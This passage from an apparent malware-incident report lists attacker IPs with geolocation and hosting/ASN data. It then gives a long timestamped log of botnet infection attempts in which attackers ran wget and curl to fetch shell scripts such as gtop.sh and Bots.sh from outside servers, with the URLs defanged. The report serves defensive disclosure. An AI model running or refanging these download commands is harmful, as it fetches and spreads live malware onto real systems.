\/\u003E216.158.225.7, Secaucus, 07094, United States, 40.7801, -74.0633\u003Cbr \/\u003E218.104.49.211, - , - , China, 35.0, 105.0\u003Cbr \/\u003E23.227.163.110, - , - , United States, 38.0, -97.0\u003Cbr \/\u003E23.89.158.69, Los Angeles, 90017, United States, 34.053, -118.2642\u003Cbr \/\u003E23.94.29.218, Buffalo, 14221, United States, 42.9864, -78.7279\u003Cbr \/\u003E31.14.136.142, - , - , Romania, 46.0, 25.0\u003Cbr \/\u003E45.32.232.197, Amsterdam, 1000, Netherlands, 52.35, 4.9167\u003Cbr \/\u003E46.101.71.240, London, EC4N, United Kingdom, 51.5142, -0.0931\u003Cbr \/\u003E5.196.249.163, - , - , France, 48.86, 2.35\u003Cbr \/\u003E51.254.212.84, - , - , France, 48.86, 2.35\u003Cbr \/\u003E51.254.238.19, - , - , France, 48.86, 2.35\u003Cbr \/\u003E64.20.33.134, Secaucus, 07094, United States, 40.7801, -74.0633\u003Cbr \/\u003E74.118.193.239, Clarks Summit, 18411, United States, 41.4486, -75.728\u003Cbr \/\u003E79.143.181.158, - , - , Germany, 51.0, 9.0\u003Cbr \/\u003E80.82.64.177, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E89.248.162.171, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E89.248.166.131, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E93.171.158.242, Khmelnitskiy, - , Ukraine, 47.7278, 34.1372\u003Cbr \/\u003E94.102.49.197, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E94.102.53.144, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E94.102.63.136, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E4. CSV Network Routing Databse \u003Cpre class=\"brush: javascript\"\u003E\u003Cbr \/\u003E107.172.23.133,\"biz.kcscleaning.net\".  ,36352 , 107.172.20.0\/22 , AS-COLOCROSSING , US , nwnx.net , New Wave Netconnect LLC\u003Cbr \/\u003E158.69.205.212,\"212.ip-158-69-205.net\".,16276 , 158.69.0.0\/16 , OVH , FR , parsons.com , Parsons Corporation\u003Cbr \/\u003E158.69.217.211,\"211.ip-158-69-217.net\",16276 , 158.69.0.0\/16 , OVH , FR , parsons.com , Parsons Corporation\u003Cbr \/\u003E162.208.8.203 , - ,11878 , 162.208.8.0\/22 , TZULO , US , vpscheap.net , VPS Cheap Inc.\u003Cbr \/\u003E162.213.195.144, - ,54540 , 162.213.195.0\/24 , INCERO , US , inceronetwork.com , Incero LLC\u003Cbr \/\u003E163.47.11.201, - ,133165 , 163.47.8.0\/22 , DIGITALOCEAN-AS , SG , digitalocean.com , Digital Ocean Inc.\u003Cbr \/\u003E173.208.196.202, - ,32097 , 173.208.128.0\/17 , WII-KC , US , goldvipclub.com , Gold VIP Club\u003Cbr \/\u003E173.214.160.90,\"scrubzei.com\",19318 , 173.214.160.0\/24 , NJIIX-AS-1 , US , interserver.net , Interserver Inc\u003Cbr \/\u003E173.242.119.122, - ,46664 , 173.242.119.0\/24 , VOLUMEDRIVE , US , volumedrive.com , VolumeDrive\u003Cbr \/\u003E176.123.29.105,\"176-123-29-105.alexhost.md\",200019 , 176.123.0.0\/19 , ASCLOUDATA , MD , alexhost.md , AlexHost SRL\u003Cbr \/\u003E178.19.111.244,\"traderproject.com\",59491 , 178.19.104.0\/21 , LIVENET , PL , sitel.net.pl , SITEL Sp z o. o.\u003Cbr \/\u003E185.112.249.111, - ,42831 , 185.112.249.0\/24 , UKSERVERS , GB , - , -\u003Cbr \/\u003E185.112.249.253,\"pocztafoundation.swidnica.pl\",42831 , 185.112.249.0\/24 , UKSERVERS , GB , - , -\u003Cbr \/\u003E185.112.249.26,\"no.rdns.sharkservers.net\",42831 , 185.112.249.0\/24 , UKSERVERS , GB , - , -\u003Cbr \/\u003E185.130.5.200, - ,203569 , 185.130.5.0\/24 , SILK , LT , - , Sindicate Group Ltd\u003Cbr \/\u003E185.130.5.205, - ,203569 , 185.130.5.0\/24 , SILK , LT , - , Sindicate Group Ltd\u003Cbr \/\u003E185.130.5.246, - ,203569 , 185.130.5.0\/24 , SILK , LT , - , Sindicate Group Ltd\u003Cbr \/\u003E185.17.30.239, - ,199420 , 185.17.28.0\/22 , FLYGROUP , RU , fly-group.ru , OOO Fly Engeneering Group\u003Cbr \/\u003E185.29.9.253,\"ip-9-253.dataclub.biz\",60567 , 185.29.9.0\/24 , DATACLUB , SE , dataclub.biz , Virtual Servers\u003Cbr \/\u003E185.52.2.114,\"web.minsupport.net\",198203 , 185.52.0.0\/22 , ASN , NL , ramnode.com , RamNode LLC\u003Cbr \/\u003E185.62.189.11,\"cacti.s42.voby.se\",49349 , 185.62.189.0\/24 , DOTSI , PT , nforce.com , NForce Entertainment B.V.\u003Cbr \/\u003E185.62.190.156,\"hosted-by.blazingfast.io\",49349 , 185.62.190.0\/24 , DOTSI , PT , nforce.com , NForce Entertainment B.V.\u003Cbr \/\u003E185.62.190.253,\"hosted-by.blazingfast.io\",49349 , 185.62.190.0\/24 , DOTSI , PT , nforce.com , NForce Entertainment B.V.\u003Cbr \/\u003E185.62.190.62,\"hosted-by.blazingfast.io\",49349 , 185.62.190.0\/24 , DOTSI , PT , nforce.com , NForce Entertainment B.V.\u003Cbr \/\u003E192.227.170.67,\"www.AlphaNineVPS.com\",36352 , 192.227.168.0\/21 , AS-COLOCROSSING , US , hudsonvalleyhost.com , Hudson Valley Host\u003Cbr \/\u003E192.227.177.120,\"192-227-177-120-host.colocrossing.com\",36352 , 192.227.176.0\/22 , AS-COLOCROSSING , US , nwnx.net , New Wave Netconnect LLC\u003Cbr \/\u003E192.227.177.127,\"192-227-177-127-host.colocrossing.com\",36352 , 192.227.176.0\/22 , AS-COLOCROSSING , US , nwnx.net , New Wave Netconnect LLC\u003Cbr \/\u003E192.243.109.128, - ,11878 , 192.243.96.0\/20 , TZULO , US , vpscheap.net , VPS Cheap Inc.\u003Cbr \/\u003E192.243.109.5, - ,11878 , 192.243.96.0\/20 , TZULO , US , vpscheap.net , VPS Cheap Inc.\u003Cbr \/\u003E198.12.97.67,\"198-12-97-67-host.enwebhost.net\",36352 , 198.12.96.0\/20 , AS-COLOCROSSING , US , colocrossing.com , ColoCrossing\u003Cbr \/\u003E198.12.97.93,\"198-12-97-93-host.enwebhost.net\",36352 , 198.12.96.0\/20 , AS-COLOCROSSING , US , colocrossing.com , ColoCrossing\u003Cbr \/\u003E198.23.238.203,\"198-23-238-203-host.enwebhost.net\",36352 , 198.23.232.0\/21 , AS-COLOCROSSING , US , enwebhost.net , Enwebhost\u003Cbr \/\u003E198.23.238.215,\"198-23-238-215-host.enwebhost.net\",36352 , 198.23.232.0\/21 , AS-COLOCROSSING , US , enwebhost.net , Enwebhost\u003Cbr \/\u003E198.23.238.251,\"198-23-238-251-host.enwebhost.net\",36352 , 198.23.232.0\/21 , AS-COLOCROSSING , US , enwebhost.net , Enwebhost\u003Cbr \/\u003E199.180.133.178,\"watchhere.docadvices.com\",23033 , 199.180.133.0\/24 , WOW , US , virpus.com , DNSSlave.com\u003Cbr \/\u003E199.180.133.214, - ,23033 , 199.180.133.0\/24 , WOW , US , virpus.com , DNSSlave.com\u003Cbr \/\u003E199.231.184.237,\"mail10.sipanhost.com\",19318 , 199.231.184.0\/21 , NJIIX-AS-1 , US , interserver.net , Interserver Inc\u003Cbr \/\u003E206.72.207.194,\"lht194.cowanci.com\",19318 , 206.72.192.0\/20 , NJIIX-AS-1 , US , interserver.net , Interserver Inc\u003Cbr \/\u003E208.67.1.142, - ,33387 , 208.67.1.0\/24 , DATASHACK , US , wholesaledatacenter.com , Wholesale Data Center LLC\u003Cbr \/\u003E208.67.1.165, - ,33387 , 208.67.1.0\/24 , DATASHACK , US , wholesaledatacenter.com , Wholesale Data Center LLC\u003Cbr \/\u003E208.67.1.2, - ,33387 , 208.67.1.0\/24 , DATASHACK , US , hmccah.com , HMC\/Cah\u003Cbr \/\u003E208.67.1.3, - ,33387 , 208.67.1.0\/24 , DATASHACK , US , hmccah.com , HMC\/Cah\u003Cbr \/\u003E208.67.1.40, - ,33387 , 208.67.1.0\/24 , DATASHACK , US , wholesaledatacenter.com , Fletcher Grant\u003Cbr \/\u003E208.67.1.52, - ,33387 , 208.67.1.0\/24 , DATASHACK , US , wholesaledatacenter.com , Wholesale Data Center LLC\u003Cbr \/\u003E208.67.1.73, - ,33387 , 208.67.1.0\/24 , DATASHACK , US , tricension.net , Tricension\u003Cbr \/\u003E208.67.1.88, - ,33387 , 208.67.1.0\/24 , DATASHACK , US , tricension.net , Tricension\u003Cbr \/\u003E208.73.207.236,\"sonypaio.com\",19318 , 208.73.200.0\/21 , NJIIX-AS-1 , US , interserver.net , Interserver Inc\u003Cbr \/\u003E208.89.211.111,\"server6.lega-helplineservice.com\",23033 , 208.89.211.0\/24 , WOW , US , virpus.com , DNSSlave.com\u003Cbr \/\u003E208.89.211.141, - ,23033 , 208.89.211.0\/24 , WOW , US , virpus.com , DNSSlave.com\u003Cbr \/\u003E216.158.225.7,\"server.iceybinary.com\",19318 , 216.158.224.0\/23 , NJIIX-AS-1 , US , interserver.net , Interserver Inc\u003Cbr \/\u003E218.104.49.211, - ,9929 , 218.104.48.0\/23 , CNCNET , CN , chinaunicom.com , China Unicom IP Network\u003Cbr \/\u003E23.227.163.110, - ,54540 , 23.227.163.0\/24 , INCERO , US , inceronetwork.com , Incero LLC\u003Cbr \/\u003E23.89.158.69,\"69.158-89-23.rdns.scalabledns.com\",18978 , 23.89.128.0\/18 , ENZUINC-US , US , enzu.com , Enzu Inc\u003Cbr \/\u003E23.94.29.218,\"23-94-29-218-host.colocrossing.com\",36352 , 23.94.16.0\/20 , AS-COLOCROSSING , US , nwnx.net , New Wave Netconnect LLC\u003Cbr \/\u003E31.14.136.142,\"host142-136-14-31.serverdedicati.aruba.it\",31034 , 31.14.128.0\/20 , ARUBA , IT , jump.ro , Jump Management SRL\u003Cbr \/\u003E45.32.232.197,\"45.32.232.197.vultr.com\",20473 , 45.32.232.0\/21 , AS-CHOOPA , US , choopa.com , Choopa LLC\u003Cbr \/\u003E46.101.71.240, - ,201229 , 46.101.68.0\/22 , DIGITALOCEAN , DE , digitalocean.com , Digital Ocean Inc.\u003Cbr \/\u003E5.196.249.163, - ,16276 , 5.196.0.0\/16 , OVH , FR , ovh.com , OVH SAS\u003Cbr \/\u003E51.254.212.84,\"84.ip-51-254-212.eu\",16276 , 51.254.0.0\/15 , OVH , FR , ovh.com , OVH SAS\u003Cbr \/\u003E51.254.238.19, - ,16276 , 51.254.0.0\/15 , OVH , FR , ovh.com , OVH SAS\u003Cbr \/\u003E64.20.33.134,\"test.interserver.net\",19318 , 64.20.32.0\/19 , NJIIX-AS-1 , US , fasttechrev.com , Hosting Needs\u003Cbr \/\u003E74.118.193.239,\"mail.rodesleads.info\",46664 , 74.118.192.0\/22 , VOLUMEDRIVE , US , volumedrive.com , VolumeDrive\u003Cbr \/\u003E79.143.181.158,\"vmi59412.contabo.host\",51167 , 79.143.180.0\/23 , CONTABO , DE , contabo.de , Contabo GmbH\u003Cbr \/\u003E80.82.64.177, - ,29073 , 80.82.64.0\/24 , QUASINETWORKS , NL , ecatel.net , Ecatel LTD\u003Cbr \/\u003E89.248.162.171,\"no-reverse-dns-configured.com\",29073 , 89.248.160.0\/21 , QUASINETWORKS , NL , ecatel.net , Ecatel LTD\u003Cbr \/\u003E89.248.166.131,\"no-reverse-dns-configured.com\",29073 , 89.248.160.0\/21 , QUASINETWORKS , NL , ecatel.net , Ecatel LTD\u003Cbr \/\u003E93.171.158.242,\"ua63.com\",201094 , 93.171.158.0\/23 , GMHOST , UA , - , PE Dunaeivskyi Denys Leonidovich\u003Cbr \/\u003E94.102.49.197,\"no-reverse-dns-configured.com\",29073 , 94.102.48.0\/20 , QUASINETWORKS , NL , ecatel.net , Ecatel LTD\u003Cbr \/\u003E94.102.53.144, - ,29073 , 94.102.48.0\/20 , QUASINETWORKS , NL , ecatel.net , Ecatel LTD\u003Cbr \/\u003E94.102.63.136,\"no-reverse-dns-configured.com\",29073 , 94.102.48.0\/20 , QUASINETWORKS , NL , ecatel.net , Ecatel LTD\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E5. Log of infection attempts time stamp (as cyber incident evidence): \u003Cpre class=\"brush: javascript\"\u003E\u003Cbr \/\u003E2016-02-07 09:28:17 | wget hxxp:\/\/ 199.180.133.178\/gb . sh\u003Cbr \/\u003E2016-02-07 07:32:41 | wget -q hxxp:\/\/ 198.23.238.215\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-07 07:32:40 | wget -q hxxp:\/\/ 198.23.238.215\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-07 02:53:41 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-07 02:53:19 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-07 02:43:05 | wget -q hxxp:\/\/ 198.23.238.215\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-07 02:43:03 | wget -q hxxp:\/\/ 198.23.238.215\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-06 21:13:35 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-06 21:08:45 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-06 20:07:20 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-06 19:05:34 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-06 16:45:10 | wget hxxp:\/\/ 173.208.196.202\/bin . sh\u003Cbr \/\u003E2016-02-06 16:39:47 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 16:39:47 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 16:21:26 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 16:21:24 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 16:07:20 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 16:07:19 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 16:01:37 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 15:56:40 | wget hxxp:\/\/ 173.208.196.202\/bin . sh\u003Cbr \/\u003E2016-02-06 15:26:51 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-06 15:26:29 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-06 15:20:01 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 15:10:50 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 15:10:49 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 15:03:38 | wget -q hxxp:\/\/ 208.67.1.88\/Bots . sh; \u003Cbr \/\u003E                              curl -O hxxp:\/\/ 208.67.1.88\/Bots . sh\u003Cbr \/\u003E2016-02-06 14:50:55 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 14:50:55 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 14:32:41 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 14:32:40 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 14:19:15 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-06 14:18:29 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 14:18:28 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 14:10:31 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-06 05:54:46 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 05:53:55 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 05:14:34 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 05:10:55 | wget hxxp:\/\/ 173.208.196.202\/bin . sh\u003Cbr \/\u003E2016-02-06 05:00:33 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 04:50:58 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 04:48:09 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 04:38:09 | wget hxxp:\/\/ 173.208.196.202\/bin . sh\u003Cbr \/\u003E2016-02-06 04:37:42 | wget hxxp:\/\/ 173.208.196.202\/bin . sh\u003Cbr \/\u003E2016-02-06 04:06:58 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 03:53:04 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 03:41:42 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-06 03:26:44 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 03:11:10 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 02:52:44 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 02:49:12 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-06 02:41:54 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 02:38:04 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 02:16:13 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-06 01:36:28 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 01:22:23 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-06 00:56:47 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-05 23:35:07 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-05 23:02:54 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-05 22:59:49 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-05 22:48:41 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-05 22:48:41 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-05 22:35:55 | wget hxxp:\/\/ 208.67.1.73\/gtop . sh\u003Cbr \/\u003E2016-02-05 22:27:07 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-02-05 20:34:10 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-05 20:30:07 | wget hxxp:\/\/ 185.62.190.253\/h . sh\u003Cbr \/\u003E2016-02-05 19:37:34 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-05 19:12:30 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-05 17:37:32 | wget -q hxxp:\/\/ 23.227.163.110\/Bots\/Bots . sh\u003Cbr \/\u003E2016-02-05 17:25:07 | wget -q hxxp:\/\/ 208.67.1.88\/Bots . sh;\u003Cbr \/\u003E                              curl -O hxxp:\/\/ 208.67.1.88\/Bots . sh\u003Cbr \/\u003E2016-02-05 17:11:41 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-05 16:57:42 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-05 16:53:47 | wget hxxp:\/\/ \"www.hongcherng.com\"\/rd\/rd . sh-O \/tmp\/rd . sh\u003Cbr \/\u003E2016-02-05 16:35:55 | wget hxxp:\/\/ 185.17.30.239\/gb . sh-O \/dev\/gb . sh\u003Cbr \/\u003E2016-02-05 16:28:58 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-05 15:22:29 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-05 14:49:42 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-05 14:24:34 | wget ftx:\/\/199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-05 12:57:25 | wget hxxp:\/\/ 51.254.212.84\/busybox . sh\u003Cbr \/\u003E2016-02-05 05:17:28 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-05 05:17:24 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-05 05:02:22 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-05 04:16:29 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-05 03:13:40 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-05 03:13:37 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-05 03:08:11 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-05 02:53:57 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-05 02:27:49 | wget -q hxxp:\/\/ 185.52.2.114\/h . sh\u003Cbr \/\u003E2016-02-05 01:53:07 | wget -q hxxp:\/\/ 208.67.1.88\/Bots . sh;\u003Cbr \/\u003E                              curl -O hxxp:\/\/ 208.67.1.88\/Bots . sh\u003Cbr \/\u003E2016-02-04 23:57:43 | wget -q hxxp:\/\/ 208.67.1.88\/Bots . sh;\u003Cbr \/\u003E                              curl -O hxxp:\/\/ 208.67.1.88\/Bots . sh\u003Cbr \/\u003E2016-02-04 23:52:45 | wget hxxp:\/\/ 208.67.1.73\/gtop . sh\u003Cbr \/\u003E2016-02-04 23:37:23 | wget hxxp:\/\/ 208.67.1.73\/gtop . sh\u003Cbr \/\u003E2016-02-04 23:31:59 | wget -q hxxp:\/\/ 208.67.1.88\/Bots . sh;\u003Cbr \/\u003E                              curl -O hxxp:\/\/ 208.67.1.88\/Bots . sh\u003Cbr \/\u003E2016-02-04 23:19:54 | wget -q hxxp:\/\/ 185.130.5.200\/bin . sh;\u003Cbr \/\u003E                              curl -O hxxp:\/\/ 185.130.5.200\/bin . sh\u003Cbr \/\u003E2016-02-04 21:39:37 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-04 21:39:35 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-04 16:42:04 | wget -q hxxp:\/\/ 185.52.2.114\/h . sh\u003Cbr \/\u003E2016-02-04 09:08:52 | wget hxxp:\/\/ 185.17.30.239\/gb . sh-O \/dev\/gb . sh\u003Cbr \/\u003E2016-02-04 08:18:15 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-04 08:18:12 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-04 05:37:42 | wget -q hxxp:\/\/ 51.254.212.84\/busybox . sh\u003Cbr \/\u003E2016-02-04 02:24:07 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-03 22:03:45 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 21:53:31 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 20:53:03 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 20:50:56 | wget hxxp:\/\/ 199.231.184.237\/gtop . sh\u003Cbr \/\u003E2016-02-03 19:27:27 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 19:13:31 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 15:26:15 | wget hxxp:\/\/ 185.112.249.111\/gtop . sh\u003Cbr \/\u003E2016-02-03 15:09:15 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 14:55:09 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 14:47:47 | wget hxxp:\/\/ 185.112.249.111\/gtop . sh\u003Cbr \/\u003E2016-02-03 13:56:59 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 13:40:26 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 08:12:38 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-03 08:12:35 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-03 05:18:19 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 05:06:33 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-03 04:52:47 | wget hxxp:\/\/ 176.123.29.105\/bin . sh\u003Cbr \/\u003E2016-02-03 02:26:22 | wget hxxp:\/\/ 208.67.1.142\/hack\/Binarys . sh\u003Cbr \/\u003E2016-02-03 01:10:27 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-02-03 00:58:32 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-02-03 00:01:30 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-02-02 22:43:01 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-02 22:36:19 | wget hxxp:\/\/ 185.112.249.26\/gtop . sh\u003Cbr \/\u003E2016-02-02 21:28:54 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-02-02 18:25:35 | wget hxxp:\/\/ 185.17.30.239\/gb . sh-O \/dev\/gb . sh\u003Cbr \/\u003E2016-02-02 13:34:51 | wget hxxp:\/\/ 185.112.249.111\/gtop . sh\u003Cbr \/\u003E2016-02-02 13:16:29 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-02-02 13:06:42 | wget hxxp:\/\/ 185.112.249.111\/gtop . sh\u003Cbr \/\u003E2016-02-02 12:46:48 | wget hxxp:\/\/ 185.112.249.111\/gtop . sh\u003Cbr \/\u003E2016-02-02 11:05:21 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-02-02 06:32:25 | wget hxxp:\/\/ 185.17.30.239\/gb . sh-O \/dev\/gb . sh\u003Cbr \/\u003E2016-02-02 01:53:15 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-02 01:53:15 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-01 23:43:22 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-02-01 22:41:07 | wget hxxp:\/\/ feds.pw\/feds\/gb . sh\u003Cbr \/\u003E2016-02-01 17:10:33 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-01 16:15:24 | wget hxxp:\/\/ 192.243.109.5\/DOGDICKS\/gtop . sh\u003Cbr \/\u003E2016-02-01 13:35:18 | wget hxxp:\/\/ 185.17.30.239\/gb . sh-O \/dev\/gb . sh\u003Cbr \/\u003E2016-02-01 11:48:58 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-01 07:21:48 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-01 07:21:48 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-02-01 06:52:14 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-01 05:19:06 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-01 02:43:18 | wget hxxp:\/\/ 185.29.9.253\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-02-01 01:59:09 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-01 01:27:37 | wget hxxp:\/\/ 107.172.23.133\/gtop . sh\u003Cbr \/\u003E2016-02-01 01:24:01 | wget hxxp:\/\/ 185.112.249.253\/gtop . sh\u003Cbr \/\u003E2016-02-01 01:10:43 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . 